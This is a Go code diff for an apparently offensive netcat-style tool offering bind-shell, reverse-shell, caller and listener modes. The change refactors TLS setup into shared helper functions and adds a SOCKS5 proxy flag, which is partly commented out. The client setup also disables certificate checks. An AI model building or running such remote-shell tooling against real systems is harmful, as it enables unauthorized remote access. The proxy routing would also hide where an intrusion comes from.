@@ -25,6 +25,7 @@ type NetcatInput struct {
 	Caller      bool
 	Listener    bool
 	Tls         bool
+	Proxy       string
 }
 
 func (nni *NetcatInput) SetNetcatInput(fs *flag.FlagSet) {
@@ -35,6 +36,7 @@ func (nni *NetcatInput) SetNetcatInput(fs *flag.FlagSet) {
 	fs.BoolVar(&nni.Caller, "caller", false, "Call to a bind shell.")
 	fs.BoolVar(&nni.Listener, "listen", false, "Create a Listener for rev shells.")
 	fs.BoolVar(&nni.Tls, "tls", false, "Use encryption for Netcat connection. RECOMMENDED")
+	fs.StringVar(&nni.Proxy, "proxy", "", "Use a SOCKS5 proxy between us and target, example 127.0.0.1:9050")
 }
 
 func NetcatArgLogic(nni *NetcatInput) {
@@ -48,29 +50,38 @@ func NetcatArgLogic(nni *NetcatInput) {
 		BindLogic(bindAddress, osRuntime)
 	}
 	if nni.Bind && nni.Tls {
-		encryption.GenerateSelfSignedServerCert()
-		TlsBindLogicServer(bindAddress, osRuntime)
+		tlsConfig := SetupTLSServer()
+		TlsBindLogicServer(tlsConfig, bindAddress, osRuntime)
+	}
+	if nni.Reverse && nni.Tls && nni.Proxy != "" {
+		// dialer := proxies.DialThroughSOCKS5(nni.Proxy)
+		tlsConfig := SetupTLSClient()
+		TlsReverseLogic(tlsConfig, callAddress, osRuntime)
 	}
 	if nni.Reverse && !nni.Tls {
 		ReverseLogic(callAddress, osRuntime)
 	}
 	if nni.Reverse && nni.Tls {
-		encryption.GenerateSelfSignedClientCert()
-		TlsReverseLogic(callAddress, osRuntime)
+		tlsConfig := SetupTLSClient()
+		TlsReverseLogic(tlsConfig, callAddress, osRuntime)
 	}
+	// if nni.Caller && nni.Tls && nni.Proxy != "" {
+	// 	proxies.DialThroughSOCKS5(nni.Proxy)
+	// 	TlsBindLogicClient(callAddress)
+	// }
 	if nni.Caller && !nni.Tls {
 		CallBindLogic(callAddress)
 	}
 	if nni.Caller && nni.Tls {
-		encryption.GenerateSelfSignedClientCert()
-		TlsBindLogicClient(callAddress)
+		tlsConfig := SetupTLSClient()
+		TlsBindLogicClient(tlsConfig, callAddress)
 	}
 	if nni.Listener && !nni.Tls {
 		OpenListener(bindAddress, osRuntime)
 	}
 	if nni.Listener && nni.Tls {
-		encryption.GenerateSelfSignedServerCert()
-		TlsOpenListener(bindAddress, osRuntime)
+		tlsConfig := SetupTLSServer()
+		TlsOpenListener(tlsConfig, bindAddress, osRuntime)
 	}
 }
 
@@ -131,7 +142,7 @@ func ReverseLogic(callAddress string, osRuntime string) {
 	}
 }
 
-func TlsReverseLogic(callAddress string, osRuntime string) {
+func SetupTLSClient() *tls.Config {
 	//Generate client cert and key
 	certPEM, keyPEM, err := encryption.GenerateSelfSignedClientCert()
 	if err != nil {
@@ -148,7 +159,30 @@ func TlsReverseLogic(callAddress string, osRuntime string) {
 		Certificates:       []tls.Certificate{cert},
 		InsecureSkipVerify: true,
 	}
+	return tlsConfig
+}
 
+func SetupTLSServer() *tls.Config {
+	//Generate server cert and key
+	certPEM, keyPEM, err := encryption.GenerateSelfSignedServerCert()
+	if err != nil {
+		log.Fatalln(err)
+	}
+	// Load server's certificate and private key
+	// cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
+	cert, err := tls.X509KeyPair(certPEM, keyPEM)
+	if err != nil {
+		log.Fatalf("server: loadkeys: %s", err)
+	}
+
+	// Configure TLS with server certificate
+	tlsConfig := &tls.Config{
+		Certificates: []tls.Certificate{cert},
+	}
+	return tlsConfig
+}
+
+func TlsReverseLogic(tlsConfig *tls.Config, callAddress, osRuntime string) {
 	for {
 		caller, err := tls.Dial("tcp", callAddress, tlsConfig)
 		if err != nil {
@@ -197,23 +231,7 @@ func BindLogic(bindAddress string, osRuntime string) {
 	}
 }
 
-func TlsBindLogicServer(bindAddress string, osRuntime string) {
-	//Generate server cert and key
-	certPEM, keyPEM, err := encryption.GenerateSelfSignedServerCert()
-	if err != nil {
-		log.Fatalln(err)
-	}
-	// Load server's certificate and private key
-	// cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
-	cert, err := tls.X509KeyPair(certPEM, keyPEM)
-	if err != nil {
-		log.Fatalf("server: loadkeys: %s", err)
-	}
-
-	// Configure TLS with server certificate
-	tlsConfig := &tls.Config{
-		Certificates: []tls.Certificate{cert},
-	}
+func TlsBindLogicServer(tlsConfig *tls.Config, bindAddress string, osRuntime string) {
 	// Create a TLS listener
 	listener, err := tls.Listen("tcp", bindAddress, tlsConfig)
 	if err != nil {
@@ -240,23 +258,7 @@ func TlsBindLogicServer(bindAddress string, osRuntime string) {
 	}
 }
 
-func TlsBindLogicClient(callAddress string) {
-	//Generate client cert and key
-	certPEM, keyPEM, err := encryption.GenerateSelfSignedClientCert()
-	if err != nil {
-		log.Fatalln(err)
-	}
-
-	cert, err := tls.X509KeyPair(certPEM, keyPEM)
-	if err != nil {
-		log.Fatalf("client: loadkeys: %s\n", err)
-	}
-
-	// Configure TLS with client certificate
-	tlsConfig := &tls.Config{
-		Certificates:       []tls.Certificate{cert},
-		InsecureSkipVerify: true,
-	}
+func TlsBindLogicClient(tlsConfig *tls.Config, callAddress string) {
 
 	caller, err := tls.Dial("tcp", callAddress, tlsConfig)
 	if err != nil {
@@ -392,23 +394,7 @@ func OpenListener(bindAddress string, osRuntime string) {
 	}
 }
 
-func TlsOpenListener(bindAddress string, osRuntime string) {
-	//Generate server cert and key
-	certPEM, keyPEM, err := encryption.GenerateSelfSignedServerCert()
-	if err != nil {
-		log.Fatalln(err)
-	}
-	// Load server's certificate and private key
-	// cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
-	cert, err := tls.X509KeyPair(certPEM, keyPEM)
-	if err != nil {
-		log.Fatalf("server: loadkeys: %s", err)
-	}
-
-	// Configure TLS with server certificate
-	tlsConfig := &tls.Config{
-		Certificates: []tls.Certificate{cert},
-	}
+func TlsOpenListener(tlsConfig *tls.Config, bindAddress string, osRuntime string) {
 	// Create a TLS listener
 	listener, err := tls.Listen("tcp", bindAddress, tlsConfig)
 	if err != nil {
